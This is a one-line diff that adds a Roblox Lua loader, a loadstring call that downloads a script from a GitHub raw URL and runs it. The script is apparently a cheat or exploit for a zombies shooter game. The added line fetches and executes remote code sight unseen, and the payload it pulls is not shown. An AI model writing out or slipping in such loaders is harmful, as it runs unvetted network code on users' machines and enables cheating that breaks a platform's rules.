@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ContractorStrike/loaders/main/loaders/zombies-hypershot-spam1-wiuo9nrto1qq0u.lua"))()
